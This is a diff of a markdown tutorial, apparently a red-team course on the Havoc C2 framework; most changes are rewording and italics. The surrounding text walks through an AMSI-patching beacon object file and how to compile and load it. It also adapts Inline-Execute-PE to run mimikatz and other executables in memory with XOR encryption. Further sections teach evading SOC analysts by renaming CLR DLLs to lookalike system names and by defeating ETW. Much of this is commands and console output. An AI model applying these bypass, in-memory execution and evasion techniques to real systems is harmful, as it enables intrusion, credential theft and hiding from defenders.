@@ -1413,7 +1424,7 @@ class Packer:
         self.size += calcsize(fmt)
 ```
 
-We perform the same check as in the other module, making sure that we are not in an x86 process.
+We then perform the same check as in the other module, making sure that we are not in an *x86* process.
 
 ```
 if demon.ProcessArch == "x86":
@@ -1421,19 +1432,19 @@ if demon.ProcessArch == "x86":
         return
 ```
 
-We provide the user with a debug message in the console.
+Next, we provide the user with a debug message in the console.
 
 ```
 TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked beacon to patch AMSIScanBuffer()" )
 ```
 
-Initiate the Packer.
+Making sure to initiate the Packer.
 
 ```
 Task = Packer()
 ```
 
-Provide information to Havoc on what to do to execute the module. In this case, the concerned BOF is located in the `amsipatch.o` file and its entry point is at the `go` function.
+And lastly, provide the information to Havoc on what to do to execute the module. In this case, our *BOF* will be located in the `amsipatch.o` file and its entry point will be at the `go` function.
 
 ```
 demon.InlineExecute( TaskID, "go", f"amsipatch.o",b'', False)
@@ -1441,9 +1452,9 @@ demon.InlineExecute( TaskID, "go", f"amsipatch.o",b'', False)
 
 ### Creating the AMSI Patching BOF
 
-With this out of the way, it's now time to go ahead and create our BOF. BOF creation can be rather hard if it's the first time you're encountering one. However, after a bit of trial and error, you'll be way on your way to creating your own BOF's in the future.
+With this out of the way, it's now time to go ahead and create our actual *BOF*. *BOF* creations can be rather hard if it's the first time you're encountering one. However, after a bit of trial and error, you'll be way on your way to creating your own *BOF's* in the future.
 
-Let's take a look at the source of our BOF.
+Let's take a look at the source of our *BOF*.
 
 `amsipatch.c`
 
@@ -1522,7 +1533,7 @@ if (success != 1) {
 }
 ```
 
-This might appear overwhelming at first glance but we'll through each individual part together.
+This might appear overwhelming at first glance but we'll walk through each individual part together.
 
 - We start off with a few imports.
 
@@ -1536,16 +1547,16 @@ This might appear overwhelming at first glance but we'll through each individual
 #include "inlineExecute-Assembly.h"
 ```
 
-Out of those imports, 2 are not standard! 
+Out of those imports, *2* are not standard! 
 
 ```
 #include "beacon.h"
 #include "inlineExecute-Assembly.h"
 ```
 
-We will need to include them in our current working directory when compiling the BOF.
+We will need to include them in our current working directory when compiling the *BOF*.
 
-The next piece of code initiates a function and calls it `patchAMSI`. This function is the core of our AMSI bypass. Further comments were added to understand what is happening at each line.
+The next piece of code defines a function called `patchAMSI`. This function is the core of our *AMSI* bypass. Comments for each individual part are also available within the code.
 
 ```
 /*Patch AMSI*/
@@ -1598,16 +1609,16 @@ BOOL patchAMSI()
 }
 ```
 
-In sum, when called, this function will attempt to get a handle on `amsi.dll` which is the DLL that is being loaded into each process. This DLL holds the main functionality of AMSI. After getting a handle to `amsi.dll`, the function will attempt to "patch" the memory address where `AmsiScanBuffer` resides. Like mentioned before, `AmsiScanBuffer` is the buffer in which data is stored for defensive solutions to scan. If this buffer isn't available or isn't functioning properly, a bypass can be achieved.
+In a nutshell, when called, this function will attempt to get a handle on `amsi.dll` which is the *DLL* that is being loaded into each process. This *DLL* holds the main functionality of *AMSI*. After getting a handle to `amsi.dll`, the function will attempt to "*patch*" the memory address where `AmsiScanBuffer` resides. Like we mentioned before, `AmsiScanBuffer` is the buffer in which data is stored for defensive solutions to scan. If this buffer isn't available or isn't functioning properly, a bypass can be achieved.
 
-If the AMSI patch is successful, 1 is returned.
+If the *AMSI* patch is successful, *1* is returned.
 
 ```
 //Successfully patched AMSI
         return 1;
 ```
 
-Remember how we mentioned the `go` function as the entry point of BOF's? Well, here it is.
+Remember how we mentioned the `go` function as the entry point of *BOF's*? Well, here it is.
 
 ```
 /*BOF Entry Point*/
@@ -1636,15 +1647,17 @@ if (success != 1) {
 }
 ```
 
-You might have noticed the `BeaconPrintf` function that we've been using without ever declaring. This function, along many others, is part of the API's that our BOF can use.
+You might have noticed the `BeaconPrintf` function that we've been using without ever declaring it. This function, along many others, is part of the *API's* that our *BOF* can use and is located inside the *beacon.h* library file.
 
 A full list of available API's can be found here : https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_bof-c-api.htm
 
-These API's have been implemented within Havoc to facilitate our development. For example, the `BeaconPrintf` function allows sending output back to our Havoc console. This can be useful to send out success/failure messages along with related data that might help us debug the issue if a failure is encountered.
+*Note: Keep in mind that some of those API's will not be usable within Havoc because they were primarily designed for Cobalt Strike.*
+
+These API's have been implemented within Havoc to facilitate our development. For example, the `BeaconPrintf` function allows sending output back to our Havoc console. This can be especially useful for printing success/failure messages along with related data that might help us debug potential issues.
 
 ### The compilation of the BOF
 
-With the BOF now saved in `amsipatch.c`, we need to have all required libraries in the same directory as well. This includes :
+With the BOF now saved in `amsipatch.c`, we need to have all the required libraries in the same directory as well. Those libraries are:
 
 `beacon.h`
 
@@ -1778,7 +1791,7 @@ DECLSPEC_IMPORT BOOL   toWideChar(char* src, wchar_t* dst, int max);
 
 ```
 
-As well as :
+Next up is:
 
 `inlineExecute-Assembly.h`
 
@@ -3747,7 +3760,7 @@ typedef struct _IDebuggerThreadControl {
 
 ```
 
-With all these files in the same directory, we can now issue the compilation command.
+With all these files in the same directory, we can now issue the below compilation command.
 
 ```
 ➜  amsipatch git:(main) ✗ x86_64-w64-mingw32-gcc -c amsipatch.c amsipatch.o
@@ -3769,7 +3782,7 @@ When confirmed that all files are there, we can now proceed and attempt to use t
 
 # Using our AMSI Patch Module in Havoc
 
-Now that our module is created and ready to be used, we will need to import it. This can be done as follows.
+Now that our module is created and ready to be used, we will need to import it. This can be done through the *Scripts* menu as shown below.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219162651.png)
 
@@ -3777,15 +3790,15 @@ From there, click on the `Load Script` button at the bottom of the screen.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219162712.png)
 
-Now, you'll need to find the directory in which our module resides. Once found, double click on the `amsipatch.py` file to import it.
+Now, we'll need to find our *amsipatch* directory. Once found, double click on the `amsipatch.py` script to import it.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219162909.png)
 
-Once imported, let's see if it appears.
+Once imported, we can make use of the *help* command to verify whether or not our new module is accessible.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219162949.png)
 
-Appears to be there! Let's now execute it to patch AMSI in our current process.
+Appears to be there! Let's now execute it to patch *AMSI* in our current process.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219163015.png)
 
@@ -3866,45 +3879,56 @@ Triggers :
 ------------------------------
 ```
 
-Success! No alert was generated and we are now able to execute C# code in the memory of our current process without being detected.
+Success! No alert was generated and we are now able to execute *C#* code in the memory of our current process without being detected.
 
 # Improving Inline PE execution
 
-Remember the `noconsolation` module we went over some time earlier in the course? This module allowed us to execute PE's such as mimikatz completely in memory. This approach avoids the hassle of uploading the binary on disk and thus, reduces our chances of getting detected. However, we were facing problems with reading the output. The output would appear in the wrong place.
+Remember the `noconsolation` module we went over some time earlier in the course? This module allowed us to execute *PE's* such as *mimikatz* completely in memory. This approach avoids the hassle of uploading the binary on disk and thereby, reduces our chances of getting detected. However, we were facing problems with reading the output. The output would appear in the wrong place.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240219143746.png)
 
-Instead of seeing the output in our Havoc console, it would get displayed in the in the same terminal where our loader was executed. We already spoke about why this is problematic ; if we were to obtain a beacon via a phishing attack for example, we would have no way of viewing the output of our commands.
+Instead of seeing the output in our Havoc console, it would get displayed in the terminal from which our loader was executed. We already spoke about why this is problematic ; if we were to obtain a beacon via a phishing attack for example, we would have no way of viewing the output of our commands.
 
-So, to counter this, we will be looking at another alternative that is not present in Havoc at the time of writing : `Inline-Execute-PE` which can be found at the following GitHub repo.
+So, to counter this, we will be looking at another alternative that is not present in Havoc at the time of writing: `Inline-Execute-PE`, which can be found at the following GitHub repo.
 
 https://github.com/Octoberfest7/Inline-Execute-PE
 
-This module was initially intended to be used with Cobalt Strike meaning that some modifications from our part will be required to make it compatible with Havoc. 
+This module was initially intended to be used with Cobalt Strike meaning that some modifications will be required to make it compatible with Havoc. 
 
 ## Understanding the key components of Inline-Execute-PE
 
-Similar to `noconsolation`, this module will allow us to load and execute PE's completely from memory. However, there are a few keypoints that need to be considered and understood before moving further. The Inline-Execute-PE module itself, is composed of multiple modules, but we will only be using two of them :
+Similar to `noconsolation`, this module will allow us to load and execute PE's completely from memory. However, there are a few key points that need to be considered and understood before moving further. The *Inline-Execute-PE* module itself, is composed of multiple modules, but we will only be using two of them:
 
-- peload
-- perun
+- *peload*
+- *perun*
 
-The `peload` module is responsible for loading the PE's in memory. It will not **execute** it. The PE will loaded into memory at a specific open memory space. Additionally, the module will XOR-encrypt the binary bytes in memory for an extra stealth layer. Once this is done, a memory address representing the start of the PE in memory will be outputted to our Havoc console. This module will accept 2 arguments : 
+The `peload` module is responsible for loading our PE in memory. It will not **execute** it. The PE will loaded into memory at a specific open memory space. Additionally, the module will *XOR-encrypt* the binary bytes in memory for an extra stealth layer. Once this is done, a memory address representing the start of the PE in memory will be outputted to our Havoc console. 
 
-- The local binary in question(mimikatz on our machine)
-- XOR key to be used for encryption
+This module will accept 2 arguments: 
 
-The `perun` module evidently, is responsible for executing the inline PE and getting back the output. `perun`, as you'll see later on, will indeed give us the output back in the console as opposed to `noconsolation`. `perun` accepts a few arguments as well :
+- The *local binary* in question (mimikatz on our machine).
+- *XOR key* to be used for encryption.
 
-- The XOR that was initially used for encryption. This needs to be provided for a successful decryption of the PE's code in memory
-- The entry memory address where the code resides in memory
-- Any arguments that you wish to provide to the PE
+The `perun` module evidently, is responsible for executing the inline PE and getting the output back. `perun`, as you'll see later on, will indeed give us the output back in the console as opposed to `noconsolation`. 
 
+`perun` accepts a few arguments as well:
 
-We'll start by cloning the repo in our `Modules` directory. From there, we will create 2 `py` files.
+- The *XOR key* that was initially used for encryption. This needs to be provided for a successful decryption of the PE's code in memory.
+- The *entry memory address* points to the start of the binary in memory.
+- Any *arguments* that you wish to provide to the PE.
 
-- peload.py
-- perun.py
+### Cloning repo & Creating .py's For Modules
+
+We'll start by cloning the repo in our `Modules` directory.
+
+```bash
+➜  Modules git:(main) ✗ git clone https://github.com/Octoberfest7/Inline-Execute-PE.git
+```
+
+From there, we will create 2 `py` files.
+
+- *peload.py*
+- *perun.py*
 
 Those files represent the two modules that we will using. Now let's check out their contents.
 
@@ -4021,27 +4045,27 @@ RegisterCommand( perun , "", "perun", "in process execution of an exe", 0, "<key
 
 ```
 
-As you can see, those files have a high resemblance to the previous modules we've taken a look at. Instead of going through each part individually again, comments have been added at important places for your convenience.
+As you can see, those files are very similar to the previous modules we've taken a look at. Instead of going through each part individually again, comments have been added at important places for your convenience.
 
 ### Small modifications added to BOF's
 
-There have been a few modifications done to both `peload.c` and `perun.c`. Those modifications have done to reduce the number of arguments we need to specify when using the modules. This of course, is only done for our convenience. All modifications to both files are outlined below.
+There have been a few modifications done to both `peload.c` and `perun.c`. Those modifications are aimed at reducing the number of arguments we need to specify when using the modules. This of course, is only done for convenience purposes. All modifications to both files are outlined below.
 
 ```
 ➜  Inline-Execute-PE git:(main) ✗ diff peload.c peload.c.1
 221c221
-<       BOOL local = 0;
+<       BOOL local = 0; # NEW VERSION
 ---
->       BOOL local = BeaconDataInt(&parser);
+>       BOOL local = BeaconDataInt(&parser); # OLD VERSION
 ```
 
 ```
 ➜  Inline-Execute-PE git:(main) ✗ diff perun.c perun.c.1
 462,463c462
 <       //dwTimeout = BeaconDataInt(&parser);
-<       dwTimeout = 5000;
+<       dwTimeout = 5000; # NEW VERSION
 ---
->       dwTimeout = BeaconDataInt(&parser);
+>       dwTimeout = BeaconDataInt(&parser); # OLD VERSION
 465c464
 <
 ---
@@ -4056,7 +4080,7 @@ There have been a few modifications done to both `peload.c` and `perun.c`. Those
 > }
 ```
 
-Here are both files in their complete form for your convenience.
+Here are both files in their complete forms for easy copy & pasting.
 
 `peload.c`
 
@@ -4865,7 +4889,7 @@ peload.c: In function ‘getPeDir’:
 [SNIP]
 ```
 
-Once all the files are built, we can now import our new module into Havoc. 
+Once all the files are built, we can now import our new modules into Havoc. 
 
 # Testing the Inline-Execute-PE module
 
@@ -4875,7 +4899,7 @@ Like we did before with our `amsipatch` module, we'll import both the `peload.py
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240220132149.png)
 
-After the import, both files should appear in the `Script Manager`.
+After the import, both files should appear in the `Script Manager` section.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240220132236.png)
 
@@ -4883,11 +4907,11 @@ We can now verify that the modules have been imported.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240220132345.png)
 
-Looks like they have been!
+Looks like they have!
 
 ## Using peload/perun to execute PE's inline
 
-Now that we've confirmed that we have access to both modules in our Havoc environment. Let's attempt running mimikatz using them.
+Now that we've confirmed that we have access to both modules in our Havoc environment, let's attempt to execute mimikatz with their help.
 
 Firstly, like mentioned before, we will utilize `peload` to load the module into memory. We will also specify the XOR key to be used for the encryption of the PE's bytes in memory.
 
@@ -4947,7 +4971,7 @@ perun complete
 [*] BOF execution completed
 ```
 
-As you can see, this time, we were able to successfully run mimikatz completely in memory as well as obtain its output. We provided the XOR key, the entry memory address and the arguments to `perun` to ensure successful execution. If you look closely at the arguments we specified, you will notice an empty space before the "coffee" keyword. This is **intentional**. 
+As you can see, this time, we were able to successfully run mimikatz completely in memory as well as obtain its output. We provided the *XOR key*, the *entry memory address* and the *arguments* to `perun` to ensure successful execution. If you look closely at the arguments we specified, you will notice an empty space before the "*coffee*" keyword. This is **intentional**. 
 
 If this additional space isn't added, here's how the results will look like.
 
@@ -4957,7 +4981,7 @@ You will notice that only the `exit` command was executed as if the `coffee` com
 
 ## Unloading PE's to execute other ones
 
-Now that we've tested `perun's` functionality with mimikatz, let's test it out with some other PE's. For the sake of simplicity, let's check out a binary called `sigcheck64.exe` which is a tool provided by Microsoft themselves to verify signatures on binaries. This binary is not written in C# so we should be able to test it out.
+Now that we've tested `perun's` functionality with *mimikatz*, let's test it out with some other PE's. For the sake of simplicity, let's check out a binary called `sigcheck64.exe`, which is a tool provided by *Microsoft* themselves to verify signatures on binaries. This binary is not written in *C#* so we should be able to test it out.
 
 If we attempt to repeat the same steps we took to load mimikatz into memory, we will see that this time, the binary doesn't run, it instead crashes our beacon.
 
@@ -4979,7 +5003,7 @@ peload 2388938910560
 [+] Send Task to Agent [82 bytes]
 ```
 
-We even get a hint that memory space might be a problem : `[+] Try to Allocate Memory for New Image Base`. So, we'll need to unload PE's from memory when we're done using them. Luckily for us, the `Inline-Execute-PE` repo also provides a way to unload PE's. So let's take a look at how we will achieve this.
+We even get a hint that memory space might be a problem : `[+] Try to Allocate Memory for New Image Base`. As a result, we'll need to unload existing PE's from memory when we're done using them. Luckily for us, the `Inline-Execute-PE` repo also provides a way to *unload* PE's. So let's take a look at how we will achieve this.
 
 Start by opening the `peunload.c` file. We will first need to understand the arguments that it expects from us.
 
@@ -5017,7 +5041,7 @@ char* pMemAddrstr = BeaconDataExtract(&parser, &dataextracted);
         bUnloadLibraries = BeaconDataInt(&parser);
 ```
 
-As you can see, the first argument is placed inside the `pMemAddrstr` variable which represents the entry point in memory of our PE's bytes. From there, the `bUnloadLibraries` is populated. Judging by the  `BeaconDataInt` API, we can assume that the `bUnloadLibraries` variable expects an integer as its argument. If we scroll up a bit in the code, we will see the part where this variable is used.
+As you can see, the first argument is placed inside the `pMemAddrstr` variable which represents the entry point in memory of our PE's bytes. From there, the `bUnloadLibraries` is populated. Judging by the `BeaconDataInt` API, we can assume that the `bUnloadLibraries` variable expects an integer as its argument. If we scroll up a bit in the code, we will see the part where this variable is used.
 
 ```
 //If bUnloadLibraries == TRUE, unload DLL's.  This is default, but some PE's will crash if you try and unload the DLL's.
@@ -5026,10 +5050,10 @@ As you can see, the first argument is placed inside the `pMemAddrstr` variable w
                 cleanupModules(pMemAddrs->dwNumModules);
 ```
 
-A check is made to determine if the variable's value is `TRUE` or `FALSE`. If `TRUE`, the libraries utilized by our PE will be unloaded. If `FALSE`, they will not be. In C, `TRUE` is represented by 1 and `FALSE` is represented by 0. Thus, we will need to provide either the value 0 or 1 for this argument. So in total, 2 arguments are expected to be provided :
+A check is made to determine if the variable's value is `TRUE` or `FALSE`. If `TRUE`, the libraries utilized by our PE will be *unloaded*. If `FALSE`, they will not be. In C, `TRUE` is represented by *1* and `FALSE` is represented by *0*. Thus, we will need to provide either the value *0* or *1* for this argument. So in total, *2* arguments are expected to be provided:
 
-- The entry point in memory of our PE's bytes
-- 0 or 1 --> indicating if we want to unload the libraries or not
+- The *entry point in memory* of our PE's bytes.
+- *0 or 1* depending on if we want to unload the libraries or not.
 
 Now that we have a basic understanding of what is required to make this module work, we can proceed with creating the actual module in python.
 
@@ -5080,17 +5104,19 @@ def peunload(demonID, *param):
 RegisterCommand( peunload , "", "peunload", "Unloading of PE from memory", 0, "<entry point of PE's bytes> <0 or 1 to indicate unloading of libraries or not>", '2388938910560 1')
 ```
 
-The module specifically accepts the 2 parameters that we just mentioned and executes the `peunload.x64.o` BOF. We have already compiled all the BOF's previously so this one should already be present.
+The module specifically accepts the *2* parameters that we just mentioned and executes the `peunload.x64.o` *BOF*. We have already compiled all the *BOF's* previously so this one should already be good to go.
 
 ### peunload in practice
 
-Like we've done before, we will import `peunload.py` into Havoc. After import, we should see the import in the `Script Manager` along with the others we previously imported.
+Like we've done before, we will import `peunload.py` into Havoc. After the import, we should see it in the `Script Manager` along with the other modules we previously loaded.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240220145413.png)
 
-It's now time to test it out. For this, we've obtained a fresh beacon so we can start from scratch. We'll begin by :
+It's now time to test it out. For this, we've obtained a fresh beacon so we can start from scratch. 
 
-- Loading mimikatz in memory and making it sure that it works when executed
+Our steps will include:
+
+- Loading *mimikatz* in memory and making sure that it works when executed.
 
 ```
 20/02/2024 14:56:33 [ori] Demon » peload /home/kali/VulnLabs/mimikatz.exe key123
@@ -5140,7 +5166,7 @@ perun complete
 [*] BOF execution completed
 ```
 
-- Unload mimikatz using the memory address from `peload`
+- Unloading *mimikatz* using the memory address from `peload`.
 
 ```
 20/02/2024 14:57:02 [ori] Demon » peunload 1737779845056 1
@@ -5155,7 +5181,7 @@ peunload successful
 [*] BOF execution completed
 ```
 
-- Load the `sigcheck64.exe` binary we spoke of earlier
+- Loading the `sigcheck64.exe` binary we spoke of earlier.
 
 ```
 20/02/2024 14:57:34 [ori] Demon » peload /home/kali/VulnLabs/sigcheck64.exe key123
@@ -5168,7 +5194,7 @@ peload 1737779845056
 [+] Send Task to Agent [81 bytes]
 ```
 
-- Attempt to execute it to verify it works
+- Attempting to execute it to verify if it works.
 
 ```
 20/02/2024 14:57:49 [ori] Demon » perun key123 1737779845056 " -accepteula"
@@ -5245,70 +5271,88 @@ perun complete
 [*] BOF execution completed
 ```
 
-Looks like it works! We now have a way of loading different PE's in memory, unloading them and executing other ones. All from the same beacon and all in memory! The only caveat to consider is keeping the memory addresses outputted by `peload` for further use. If those addresses are lost, it can be very problematic to unload PE's from memory.
+Looks like it does indeed work! We now have a way of loading different PE's in memory, unloading them and executing other ones. All from the same beacon and all in memory! The only caveat to consider is keeping track of the memory addresses outputted by `peload` for further use. If those addresses are lost, it can be very problematic to unload PE's from memory.
 
 # What this would look like from a Blue Team's perspective
 
-Now that we've discussed common commands, written custom Havoc modules to bypass protection mechanisms such as AMSI, it's now time to see how all those techniques we've utilized, would look like from a defender's perspective. 
+Now that we've discussed common commands, written custom Havoc modules to bypass protection mechanisms such as *AMSI*, it's now time to see how all those techniques we've utilized, would look like from a defender's perspective. 
 
-Here's what we will be discussing in the upcoming blue team sections : 
+Here's what we will be discussing in the upcoming blue team sections: 
 
-- Detecting C# inline execution
-- Seeing how our beacon may get caught by IDS/IPS systems such as `Suricata`
-- Developing certain ways to remain undetected
+- Detecting *C#* inline execution.
+- Seeing how our beacon may get caught by IDS/IPS systems such as `Suricata`.
+- Developing certain ways to remain undetected.
 
 # The Downsides of C# Inline execution
 
-When performing inline C# execution through Havoc or any C2 that supports this feature. There's a few things to consider in terms of stealth. Firstly, in order to execute C# code, not just in memory, 2 specific DLL's need to be loaded into a process :
+When performing inline C# execution through Havoc or any C2 that supports this feature, there's a few things to consider in terms of stealth. Firstly, in order to execute C# code, not just in memory, *2* specific *DLL's* need to be loaded into a process:
 
-- clr.dll
-- clrjit.dll
+- *clr.dll*
+- *clrjit.dll*
 
-Which can be found accordingly in the following directory :
+Which can be found accordingly in the following directory:
 
-- C:\\Windows\\Microsoft.NET\\Framework64\\v.4.0.30319
+- *C:\\Windows\\Microsoft.NET\\Framework64\\v.4.0.30319*
 
-Whenever we utilize inline C# execution, those 2 DLL's are loaded into our beacon's process. Now of course, those DLL's are legitimate Microsoft signed DLL's. However, as a defender, noticing processes that shouldn't utilize those DLL's does raise a suspicion. In a real world scenario, attackers tend to give their beacons legitimate names. Names such as `svchost.exe, chrome.exe, edge.exe` or any name that wouldn't directly raise suspicion. Although this can, at times, hide the beacon, it is not an ideal way of remaining undetected. We will go over why that is in the next sections.
+Whenever we utilize inline C# execution, those *2 DLL's* are loaded into our beacon's process. Now of course, those *DLL's* are legitimate Microsoft signed *DLL's*. However, as a defender, noticing processes that shouldn't utilize those DLL's does raise a suspicion. In a real world scenario, attackers tend to give their beacons legitimate names. 
 
-In the following section, we will look at potential ways we can use to throw defenders off the right path with their investigation when it comes C# inline execution.
+Names such as `svchost.exe, chrome.exe, edge.exe` or any name that wouldn't directly raise suspicion. Although this can, at times, hide the beacon, it is not an ideal way of remaining undetected. We will go over why that is in the next sections.
+
+In the following section, we will look at potential ways we can use to throw defenders off the right path with their investigation when it comes to *C#* inline execution.
 
 # Hiding our attempts at C# inline execution
 
 ## Renaming DLL's
 
-As we've mentioned before, `clr.dll` and `clrjit.dll` get loaded into a process for C# code execution. One very important thing to consider when implementing any bypasses is ourselves a very important question : `If I was a defender, how would I go about detecting this?`. We also need to consider that SOC/forensics investigations usually only start several weeks if not months after an initial breach meaning that our beacons would have long been terminated when that happens. Still, the artifacts of our engagement can  remain in the environment and can be recovered, thus making stealth extra important.
+As we've mentioned before, `clr.dll` and `clrjit.dll` get loaded into a process when C# code execution happens. When implementing any bypasses, it is always good practice to ask ourselves the following question: `If I was a defender, how would I go about detecting this?`.
 
-Now if the organization that we are in does have some robust protection, they will definitely have a SIEM system up and running. SIEM's are systems that group all the logs obtained on machines where Agents are running. Those agents are responsible for collecting logs and sending them to the central castle : The SIEM. Logs are then stored on the SIEM and can be analyzed by SOC analysts. Of course, in a big organization's environment, the amount of logs collected can reach the millions by the day! Thus, when an attack does happen, investigating millions upon millions of logs can get rather overwhelming. For those reasons, SOC analysts utilize specialized filters when going through data in the SIEM. Of course, they will go out looking for the most obvious of things. For example, remember how we spoke about avoiding spawning processes such as cmd.exe and powershell.exe? Those tend to be clear indications of a compromise. EDR systems will also flag such processes based on UBA(User Behavior Analysis). Such processes are usually not part of a user's workflow and thus, those are flagged under the behavioral category. False positives are also very common although creation of such processes does raise an eyebrow. Additionally, SOC analysts are aware of the fact that C# inline execution relies on the 2 DLL's we spoke about previously. So, it would be a smart move to go out looking for specific names such as these 2 :
+We also need to consider that *SOC/forensics investigations* usually only start several weeks if not months after an initial breach; meaning that our beacons would have long been terminated when that happens. Still, the artifacts of our engagement can remain in the environment and can be recovered, thus making stealth extra important.
 
--  clr.dll
-- clrjit.dll
+Now if the organization we're dealing with does have some robust protection, they will definitely have a *SIEM* system up and running. *SIEM's* are systems that group all the logs obtained on machines where *Agents* are running. Those agents are responsible for collecting logs and sending them to the central castle: *The SIEM*. Logs are then stored on the *SIEM* and can be analyzed by SOC analysts. 
 
-But what if we decided to just rename them? Say, for example, to `test.dll` and `abcd.dll`? It's pretty obvious that creating a filter for this kind of tamper is practically impossible as possibilities are endless. Bonus points if you rename the DLL's to something legitimate but not related to C# in any kind. For example :
+Of course, in a big organization's environment, the amount of logs collected can reach the *millions* by the day! Thus, when an attack does happen, investigating millions upon millions of logs can get rather overwhelming. For those reasons, *SOC analysts* utilize specialized filters when going through data in the *SIEM*. Notably, they will go out looking for the most obvious of things first.
 
-- combase.dll
-- advapi32.dll
+For example, remember how we spoke about avoiding spawning processes such as *cmd.exe* and *powershell.exe*? Those tend to be clear indications of a compromise in most cases. EDR systems will also flag such processes based on *UBA (User Behavior Analysis)*. Such processes are usually not part of most user's workflows and therefore, those are flagged under the *behavioral* category. False positives are also very common, although creation of such processes does raise an eyebrow. 
 
-Those are some of the most common loaded DLL's in processes and these are not associated with any malicious activity. But you might be asking yourself, if those are already loaded in processes, how we can load our own DLL's with the same names?
+Additionally, SOC analysts are aware of the fact that *C#* inline execution relies on the *2 DLL's* we spoke about previously. So, it would be a smart move to go out looking for specific names such as these *2*:
 
-Well, of course we can start by verifying for the presence of these DLL's in our process. If they are not already present, we can go ahead and load the legitimate `clr.dll` and `clrjit.dll` as `combase.dll` and `advapi32.dll`. However, if those DLL's are in fact already in use, we can utilize another popular technique that involves slightly altering the names of legitimate DLL's. For example :
+-  *clr.dll*
+- *clrjit.dll*
+
+But what if we decided to just rename them? Say, for example, to `test.dll` and `abcd.dll`? It's pretty obvious that creating a filter for this kind of tamper is practically impossible as possibilities are endless. Bonus points if you rename the *DLL's* to something legitimate but not related to C# in any kind. For example :
+
+- *combase.dll*
+- *advapi32.dll*
+
+Those are some of the most commonly loaded DLL's in processes and are not associated with any malicious activity. But you might be asking yourself, if those are already loaded in processes, how we can load our own *DLL's* with the same names?
+
+Well, of course we can start by verifying for the presence of these *DLL's* in our process. If they are not already present, we can go ahead and load the legitimate `clr.dll` and `clrjit.dll` as `combase.dll` and `advapi32.dll`. However, if those *DLL's* are in fact already in use, we can utilize another popular technique that involves slightly altering the names of legitimate DLL's. 
+
+For example :
 
 - Instead of `advapi32.dll` --> `addvapi32.dll`
 - Instead of `combase.dll` --> `commbase.dll`
 
-Such changes are so subtle that they can barely be noticed. And once again, consider the sheer amount of logs that SOC analysts go through. Spotting such a difference in the millions of logs that we have available, is a very difficult task and would require a lot time and effort. With that being said, it is not impossible to spot these changes. Defenders could simply create a list with the most common DLL's loaded into processes and look for odd ones out. This technique isn't that common thus not all blue teams will go out there looking for it. But we figured it'd be a great addition to mention, because often times, those small details can make all the difference.
+Such changes are so subtle that they can barely be noticed. And once again, consider the sheer amount of logs that SOC analysts go through. Spotting such a difference in the millions of logs that they have available, is a very difficult task and would require a lot time and effort. With that being said, it is not impossible to spot these changes. Defenders could simply create a list with the most common DLL's loaded into processes and look for odd ones out. This technique isn't that common thus not all blue teams will go out there looking for it. But we figured it'd be a great addition to mention, because often times, those small details can make all the difference.
 ## Hiding tool related data and bypassing ETW
 
-Now, it is very important to understand that the presence of the 2 mentioned DLL's in processes does raise suspicion, but does not necessarily mean malicious activity. Of course, if you see `clr.dll` being loaded by `svchost.exe`, you know something's up. But we can do better than that. In this section, we'll take a look at a specific scenario where we will utilize C# inline execution. We'll look at artifacts that might potentially get us caught and understand how we can eliminate those artifacts.
+Now, it is very important to understand that the presence of the 2 mentioned DLL's in processes does raise suspicion, but does not necessarily indicate malicious activity. However, if you see `clr.dll` being loaded by `fontdrvhost.exe`, you know something's up. But we can do better than that. 
+
+In this section, we'll take a look at a specific scenario where we will utilize *C#* inline execution. We'll look at artifacts that might potentially get us caught and look into how we can eliminate them.
 
 ### Understanding ETW
 
-ETW, or Event Tracing for Windows provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features. 
+*ETW*, or *Event Tracing for Windows* provides a mechanism to trace and log events that are raised by *user-mode* applications and *kernel-mode* drivers. ETW is implemented in the Windows operating system and provides developers a fast, reliable, and versatile set of event tracing features. 
 
-In a nutshell, the Windows operating system has a number of `providers` running at all times. Providers that are all tasked with collecting data. All providers are tasked with collecting their own set of data. For instance, 1 provider is tasked with collecting data related to powershell execution, another one tasked with collecting data related to .NET execution and so on. All those providers collect data which can then later be used by defenders to scrutinize the evidence. ETW is also widely used by EDR products to identify threats. And when it comes to executing C# code inline, ETW will be our main enemy to defeat. 
+In a nutshell, the Windows operating system has a number of `providers` running at all times. Providers are all tasked with collecting data, with each provider being responsible for collecting their own set of data.
+
+For instance, 1 provider is tasked with collecting data related to *powershell* execution, while another one could tasked with collecting data related to *.NET executions* and so on. All those providers collect data which can then later be used by defenders to scrutinize the evidence. 
+
+ETW is also widely used by *EDR* products to identify threats. And when it comes to executing C# code inline, ETW will be our main enemy to defeat. 
 
 ### Scenario #1 - Hunting AppDomains
 
-Let's take a look at a scenario. For this, we will simply execute the `SharpHound.exe` binary inline as shown below :
+Let's take a look at a scenario. For this, we will simply execute the `SharpHound.exe` binary inline as shown below:
 
 ```
 01/03/2024 14:29:55 [Neo] Demon » dotnet inline-execute /home/kali/SquidGuard/SharpHound.exe 1.2.3.4
@@ -5327,7 +5371,9 @@ Let's take a look at a scenario. For this, we will simply execute the `SharpHoun
 
 From the Havoc Wiki, here's a quick explanation on what happened upon execution of the above command:
 
+```
 The `inline-execute` works by first creating an instance of the CLR (Common Language Runtime) within the current Demon process. After the CLR is created, `amsi.dll` is loaded and patched in-memory to bypass AMSI scanning. Demon then creates an AppDomain and loads the assembly into memory, finding the entry point and passing the commandline args supplied by the user before invoking the method. Output from the assembly is captured and returned to the teamserver.
+```
 
 With this in mind, we will utilize a tool called `Process Hacker` to identify the artifacts left behind by such an execution.
 
@@ -5335,17 +5381,19 @@ If you wish to use `Process Hacker` yourself, you can do so by downloading it fr
 
 https://processhacker.sourceforge.io/downloads.php
 
